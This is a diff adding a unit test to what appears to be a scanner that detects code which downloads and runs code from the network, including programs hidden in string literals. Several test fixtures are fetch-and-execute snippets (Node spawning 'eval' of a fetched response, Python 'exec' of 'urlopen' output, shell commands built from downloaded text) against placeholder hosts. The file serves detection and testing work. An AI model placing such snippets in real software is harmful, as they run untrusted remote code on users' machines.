@@ -286,6 +286,43 @@ class ReceivedCodeTests(unittest.TestCase):
             with self.subTest(label):
                 self.assertIsNone(core.runs_received_code(text))
 
+    def test_a_program_written_in_a_string_is_text(self):
+        # (0.1.8) A network call named in a string literal's text is the
+        # literal's own code: the value bound to the literal is text, not
+        # something received. xmlhttprequest (and xmlhttprequest-ssl, which
+        # socket.io's client used) writes a program for `node -e` that makes
+        # the request and saves the response to a file: it was "runs code it
+        # receives over the network" at import. A program in a string that
+        # runs what it fetches is still read as one, and so are template
+        # literals' and f-strings' interpolations.
+        xhr = ('var execString = "var http = require(\'http\'), https = require(\'https\'), fs = require(\'fs\');"\n'
+               '  + "var req = doRequest(options, function(response) {"\n'
+               '  + "response.on(\'data\', function(chunk) { responseText += chunk; });"\n'
+               '  + "response.on(\'end\', function() { fs.writeFileSync(\'" + contentFile + "\', responseText); });"\n'
+               '  + "});";\n'
+               'var syncProc = spawn(process.argv[0], ["-e", execString]);\n')
+        for label, text in (
+                ("xmlhttprequest's program for node -e", xhr),
+                ("printed, in Python", "import subprocess, sys\ncode = \"import urllib.request as u; "
+                 "print(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n"),
+                ("in a command line's text", "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', "
+                 "r => r.pipe(process.stdout))\\\"\");\n"),
+                ("in an f-string's text", "import os\ncmd = f\"python -c \\\"import urllib.request as u; "
+                 "print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n")):
+            with self.subTest(label):
+                self.assertIsNone(core.runs_received_code(text))
+                self.assertEqual(core.import_time_risk(text), ([], None))
+        for label, text, line in (
+                ("the program runs what it fetches", "const s = \"require('https').get(" + U + ", r => { let d = ''; "
+                 "r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\n"
+                 "spawn(process.execPath, ['-e', s], { detached: true });\n", 1),
+                ("in Python", "import subprocess, sys\ncode = \"import urllib.request as u; "
+                 "exec(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n", 2),
+                ("a template literal's interpolation", "const code = `${await (await fetch(u)).text()}`;\neval(code);\n", 2),
+                ("an f-string's interpolation", "import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n", 2)):
+            with self.subTest(label):
+                self.assertEqual(core.runs_received_code(text), line)
+
     def test_import_time_and_install_tests(self):
         for label, text, line in RECEIVED:
             with self.subTest(label):
